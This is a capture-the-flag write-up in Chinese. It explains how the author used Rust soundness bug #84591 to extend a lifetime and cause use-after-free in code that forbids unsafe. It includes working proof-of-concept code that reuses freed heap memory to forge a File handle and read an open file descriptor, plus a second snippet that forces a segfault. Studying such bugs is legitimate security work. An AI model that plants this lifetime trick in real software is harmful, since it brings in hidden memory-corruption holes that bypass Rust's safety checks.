# 编原译理习题课 · 实验班

## 解题过程

在 rust 的 issues 里逛了逛。第一个感觉有戏的是 [Double free on Linux with stable toolchain #100914](https://github.com/rust-lang/rust/issues/100914)，毕竟 double link，很符合我对野指针和任意地址写的想象。但是这个是申请大堆栈造成的，需要创建新的 thread 才能利用。但沙箱不允许创建线程，只好放弃。

之后看到了大量 lifetime 相关的 soundness 问题，比如 [#84591](https://github.com/rust-lang/rust/issues/84591) 可以 extend lifetime，返回一个失效对象的引用，很符合我对 use after free 的想象，并且不需要额外的系统调用，感觉也有戏。

首先把 POC 里的引用都改成 mut 引用。为后续做准备。然后多次尝试发现候栈上的变量失效后，有时候会被覆写，但具体什么情况下会覆写也没太搞懂。

做第一问的时候思路非常不清晰，想返回栈上的一个引用的引用，栈上失效的引用被覆盖，然后再次访问就会遇到野指针。但因为不清楚怎么控制程序去覆盖栈上的变量，所以用了一些人工 fuzz 的手段，加几个 vector 搞搞 print，试了一会还真过了。由于过于丑陋我甚至没有留下那段代码，，，

做第二问时由于要读一个已经打开的文件，必须得能控制了。这时有一个思路：如果没有发生覆写，让一个 `Vec<Option<File>> vec![None]` 失效，会释放堆上的 chunk；再创建一个相同大小的 `Vec<u32> vec![3]`，就可以拿到想要的 fd。读取之后再输出就可以了。

~~~rust
#![forbid(unsafe_code)]
use std::{fs::File, io::Read};
trait Subtrait<'a, 'b, R>: Supertrait<'a, 'b> {}
trait Supertrait<'a, 'b> {
    fn convert<T: ?Sized>(x: &'a mut T) -> &'b mut T;
}

fn need_hrtb_subtrait<'a_, 'b_, S, T: ?Sized>(x: &'a_ mut T) -> &'b_ mut T
where
    S: for<'a, 'b> Subtrait<'a, 'b, &'b &'a ()>,
{
    need_hrtb_supertrait::<S, T>(x) // <- this call works
}

fn need_hrtb_supertrait<'a_, 'b_, S, T: ?Sized>(x: &'a_ mut T) -> &'b_ mut T
where
    S: for<'a, 'b> Supertrait<'a, 'b>,
{
    S::convert(x)
}
struct MyStruct;
impl<'a: 'b, 'b> Supertrait<'a, 'b> for MyStruct {
    fn convert<T: ?Sized>(x: &'a mut T) -> &'b mut T {
        x
    }
}
impl<'a, 'b> Subtrait<'a, 'b, &'b &'a ()> for MyStruct {}

fn extend_lifetime<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
    need_hrtb_subtrait::<MyStruct, T>(x)
}
pub fn run() {
    let d;
    {
        let mut x :Vec<Option<File>> = vec![None];
        d = extend_lifetime(&mut x);
    }
    let another: Vec<u32> = vec![3];
    let mut file = d.first_mut().unwrap().take().unwrap();
    println!("Should be OK...");
    let mut buffer = String::new();
    file.read_to_string(&mut buffer).unwrap();
    println!("{}", buffer)
}
~~~

写 Writeup 时又试了个更合理让程序 SIGSEGV 的方法，即在 vector 里存指针，然后用 0 覆盖：

~~~rust
pub fn run() {
    let t = 666;
    let d;
    {
        let mut x = vec![&t];
        d = extend_lifetime(&mut x);
    }
    let another: Vec<u64> = vec![0];
    let number = *d.first().unwrap();
    println!("{:?}", number);
}
~~~
